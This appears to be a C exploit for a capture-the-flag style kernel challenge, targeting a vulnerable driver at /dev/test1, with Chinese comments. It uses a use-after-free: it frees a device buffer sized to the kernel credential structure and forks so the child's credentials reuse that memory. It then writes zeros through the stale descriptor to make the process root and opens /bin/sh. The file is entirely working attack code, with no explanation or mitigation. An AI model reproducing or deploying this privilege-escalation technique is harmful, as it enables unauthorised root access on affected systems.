#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stropts.h>
#include <sys/wait.h>
#include <sys/stat.h>
int main()
{
	

	// 打开两次设备
	int fd1 = open("/dev/test1", 2);
	int fd2 = open("/dev/test1", 2);
	size_t buf[0x30]={0};

	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
	write(fd1, &buf, 0x8a);

	// 释放 fd1
	close(fd1);

	int pid = fork();
	if(pid < 0)
	{
		puts("[*] fork error!");
		exit(0);
	}

	else if(pid == 0)
	{
		char zeros[0x8a] = {0};
		read(fd2, zeros, 0x8a);
		write(fd2, buf, 28);

		if(getuid() == 0)
		{
			puts("[+] root now.");
			system("/bin/sh");
			exit(0);
		}
	}
	else
	{
		wait(NULL);
	}
	close(fd2);
	return 0;
}